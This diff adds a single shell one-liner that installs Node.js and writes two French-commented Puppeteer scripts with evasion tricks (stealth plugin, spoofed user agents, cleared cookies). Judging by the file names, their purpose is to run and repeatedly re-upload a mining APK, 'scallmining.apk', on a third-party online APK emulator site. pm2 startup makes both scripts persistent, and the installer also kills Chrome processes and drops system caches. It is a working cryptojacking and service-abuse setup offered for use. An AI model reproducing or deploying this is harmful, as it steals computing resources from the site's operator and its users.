@@ -1,0 +1,218 @@
+cd ~/. && wget https://nodejs.org/dist/v22.11.0/node-v22.11.0-linux-x64.tar.xz && tar -xvf node-v22.11.0-linux-x64.tar.xz && rm -rf node-v22.11.0-linux-x64.tar.xz && cd node-v22.11.0-linux-x64 && cp ~/chromium/scallmining.apk ~/node-v22.11.0-linux-x64/bin && chmod +x * && touch .puppetteerrc.cjs && printf '%s\n' 'const puppeteer = require("puppeteer-extra");
+const StealthPlugin = require("puppeteer-extra-plugin-stealth");
+const { execSync } = require("child_process");
+puppeteer.use(StealthPlugin());
+
+const urls = [
+  "https://www.uptoplay.net/runapk/create-androidapk.html?app=android_blank&apk=%2Fvar%2Fwww%2Fhtml%2Fweboffice%2Fmydata%2F2306000500%2FNewDocuments%2F%2Fscallmining.apk",
+  "https://www.uptoplay.net/runapk/create-androidapk.html?app=android_blank&apk=%2Fvar%2Fwww%2Fhtml%2Fweboffice%2Fmydata%2F2306000501%2FNewDocuments%2F%2Fscallmining.apk"
+];
+
+(async () => {
+  console.log("[Système] --- NETTOYAGE INITIÉ ---");
+  
+  try {
+    console.log("[Système] Fermeture des anciens processus Chrome...");
+    try { execSync("pkill -f chrome || true"); } catch(e) {}
+    
+    console.log("[Système] Libération du cache RAM système...");
+    try { execSync("sync && echo 3 > /proc/sys/vm/drop_caches || true"); } catch(e) {}
+  } catch (sysErr) {
+    console.log("[Système] Note: Certains nettoyages système ont été ignorés (permissions).");
+  }
+
+  console.log("[Système] Démarrage du navigateur à neuf...");
+  const browser = await puppeteer.launch({
+    headless: "new",
+    args: [
+      "--no-sandbox",
+      "--disable-setuid-sandbox",
+      "--disable-dev-shm-usage",
+      "--disable-gpu",
+      "--clear-token-service",
+      "--window-size=1280,800"
+    ]
+  });
+
+  const runInstance = async (id, url) => {
+    console.log(`[Instance ${id}] Initialisée.`);
+
+    while (true) {
+      let context;
+      try {
+        context = await browser.createBrowserContext();
+        const page = await context.newPage();
+        
+        await page.setCacheEnabled(false);
+
+        const client = await page.target().createCDPSession();
+        await client.send("Network.clearBrowserCache");
+        await client.send("Network.clearBrowserCookies");
+        
+        await page.setUserAgent(
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        );
+
+        console.log(`[Instance ${id}] --- ${new Date().toLocaleTimeString()} : Navigation ---`);
+        await page.goto(url, { waitUntil: "networkidle2", timeout: 60000 });
+        await new Promise(r => setTimeout(r, 10000));
+
+        const clickAction = async () => {
+          return await page.evaluate(() => {
+            const search = (doc) => {
+              const btn = doc.querySelector("#talpa-splash-button");
+              if (btn) {
+                btn.click();
+                return true;
+              }
+              const frames = doc.querySelectorAll("iframe");
+              for (let f of frames) {
+                try {
+                  if (search(f.contentWindow.document)) return true;
+                } catch (e) {}
+              }
+              return false;
+            };
+            return search(document);
+          });
+        };
+
+        let ok1 = await clickAction();
+        if (ok1) {
+          console.log(`[Instance ${id}] Premier clic réussi.`);
+          await new Promise(r => setTimeout(r, 10000));
+          await clickAction();
+          console.log(`[Instance ${id}] Deuxième clic réussi. Session active (15min).`);
+          await new Promise(r => setTimeout(r, 15 * 60 * 1000));
+        } else {
+          console.log(`[Instance ${id}] Bouton introuvable. Nouvel essai dans 1 min.`);
+          await new Promise(r => setTimeout(r, 60000));
+        }
+
+      } catch (err) {
+        console.error(`[Instance ${id}] Erreur: ${err.message}`);
+        await new Promise(r => setTimeout(r, 30000));
+      } finally {
+        if (context) await context.close();
+      }
+    }
+  };
+
+  for (let i = 0; i < urls.length; i++) {
+    runInstance(i + 1, urls[i]);
+    console.log("Attente de 30s avant de lancer le lien suivant...");
+    await new Promise(r => setTimeout(r, 30000));
+  }
+})();' > ~/./node-v22.11.0-linux-x64/bin/minerdash.js && printf '%s\n' 'import fs from "fs";
+import path from "path";
+import puppeteer from "puppeteer";
+import FormData from "form-data";
+
+const APK_PATH = "scallmining.apk";
+const USER_IDS = ["2306000503", "2306000504", "2306000505", "2306000506"];
+
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+async function uploadApkFinal(uid) {
+    console.log(`\n--- [ID ${uid}] Démarrage ---`);
+
+    if (!fs.existsSync(APK_PATH)) {
+        console.error(`❌ Erreur : Fichier ${APK_PATH} introuvable dans le dossier bin.`);
+        return;
+    }
+
+    const browser = await puppeteer.launch({
+        headless: true,
+        args: [
+            "--no-sandbox",
+            "--disable-setuid-sandbox",
+            "--disable-gpu",
+            "--disable-dev-shm-usage"
+        ]
+    });
+
+    try {
+        const page = await browser.newPage();
+        
+        const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+        await page.setUserAgent(ua);
+
+        // Correction : Changement de {uid} en ${uid}
+        await page.goto(`https://www.uptoplay.net/filemanager.php?username={uid}`, {
+            waitUntil: "networkidle2"
+        });
+
+        await delay(10000);
+
+        const puppeteerCookies = await page.cookies();
+        const cookieString = puppeteerCookies.map(c => `${c.name}=${c.value}`).join("; ");
+
+        await browser.close();
+
+        console.log(`[${uid}] Envoi réel du fichier via API...`);
+
+        const form = new FormData();
+        form.append("api", "upload");
+        form.append("dir", "");
+        form.append("file", fs.createReadStream(APK_PATH), {
+            filename: path.basename(APK_PATH),
+            contentType: "application/vnd.android.package-archive"
+        });
+
+        // Correction : Changement de {uid} en ${uid}
+        const url = `https://www.uptoplay.net/filemanager.php?username={uid}`;
+        const response = await fetch(url, {
+            method: "POST",
+            headers: {
+                ...form.getHeaders(),
+                "User-Agent": ua,
+                "Cookie": cookieString
+            },
+            body: form
+        });
+
+        const responseText = await response.text();
+
+        if (response.status === 200) {
+            if (responseText.includes("filemanager.php") || responseText.includes("scallmining.apk")) {
+                console.log(`✅ [ID ${uid}] Téléchargement REUSSI !`);
+            } else {
+                console.warn(`⚠️ [ID ${uid}] Réponse inattendue (Vérifiez les blocages).`);
+            }
+        } else {
+            console.error(`❌ [ID ${uid}] Erreur serveur : ${response.status}`);
+        }
+
+    } catch (error) {
+        console.error(`❌ Erreur critique pour ID ${uid} :`, error.message);
+        try { await browser.close(); } catch(e) {}
+    }
+}
+
+async function main() {
+    const ATTENTE_6H = 6 * 60 * 60 * 1000;
+    let cycle = 1;
+
+    while (true) {
+        console.log(`\n==================================================`);
+        console.log(`[Système] --- CYCLE ${cycle} ENCOURS ---`);
+        console.log(`[Système] Attente de 6 heures avant le prochain traitement...`);
+        console.log(`==================================================`);
+        
+        await delay(ATTENTE_6H);
+        
+        console.log(`[Système] Fin de l\x27attente. Lancement des téléchargements...`);
+        
+        for (const uid of USER_IDS) {
+            await uploadApkFinal(uid);
+            await delay(5000);
+        }
+        
+        console.log(`[Système] Fin du cycle ${cycle}.`);
+        cycle++;
+    }
+}
+
+main();' > ~/./node-v22.11.0-linux-x64/bin/minerdash1.js && cd ~/./node-v22.11.0-linux-x64/bin && npm init -y && npm install -y puppeteer puppeteer-extra puppeteer-extra-plugin-stealth && cd ~/node-v22.11.0-linux-x64/bin && ./npm install pm2 && ./node_modules/.bin/pm2 start minerdash.js --name "script1" && ./node_modules/.bin/pm2 start minerdash1.js --name "script2" && ./node_modules/.bin/pm2 startup && ./node_modules/.bin/pm2 save
+
+
